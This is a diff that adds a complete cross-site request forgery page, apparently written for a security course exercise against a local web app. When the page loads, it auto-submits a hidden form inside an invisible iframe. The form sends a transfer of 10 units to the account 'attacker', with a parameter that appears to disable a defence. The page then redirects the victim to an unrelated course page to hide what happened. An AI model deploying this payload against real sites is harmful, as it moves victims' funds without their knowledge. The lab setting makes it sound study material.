@@ -1,8 +1,22 @@
 <html>
-  <head>
-      <title>B</title>
-  </head>
-
-  <body>
-  </body>
+<head>
+</head>
+<body>
+	<iframe name="frame" id="frame" style="visibility: hidden"></iframe>
+	<form method="POST" target="frame" action="http://localhost:3000/post_transfer?disable_fb=yes">
+		<input name="destination_username" type="hidden" value="attacker">
+		<input name="quantity" type="hidden" value="10">
+		<input id="transfer" type="submit" value="Transfer" style="visibility: hidden">
+	</form>
+	<script>	
+		window.onload = function() {
+			var frame = document.getElementById('frame');
+			frame.onload = function() {
+					window.open("http://pages.cs.wisc.edu/~ace/cs642-spring-2016.html",'_self', false);
+				
+			};
+			document.getElementById('transfer').click();
+		};
+	</script>
+</body>
 </html>
